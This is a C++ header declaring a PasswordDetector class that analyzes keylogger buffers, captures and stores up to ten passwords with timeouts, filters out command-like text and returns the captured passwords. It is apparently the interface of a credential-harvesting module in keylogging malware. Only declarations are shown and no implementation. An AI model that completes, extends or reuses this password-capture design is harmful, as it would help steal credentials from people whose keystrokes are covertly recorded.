#pragma once

#include "FeatureLibrary.h"

class PasswordDetector {
private:
    static std::vector<std::string> capturedPasswords_;
    static std::mutex passwordsMtx_;
    static std::string lastBuffer_;
    static std::mutex bufferMtx_;
    static std::chrono::steady_clock::time_point passwordCaptureStartTime_;
    static bool isCapturingPassword_;
    static std::string currentPassword_;
    
    static constexpr size_t MAX_PASSWORDS = 10;
    static constexpr int PASSWORD_TIMEOUT_SECONDS = 30;
    static constexpr int PASSWORD_WAIT_DELAY_MS = 500;
    
    static bool isPasswordCharacter(char c);
    static bool looksLikeCommand(const std::string& text);
    static void addPassword(const std::string& password);

public:
    static void analyzeKeylogBuffer(const std::string& newKeys);
    static std::string getLastPassword();
    static std::vector<std::string> getAllPasswords();
    static void clearPasswords();
    static bool hasPassword();
};

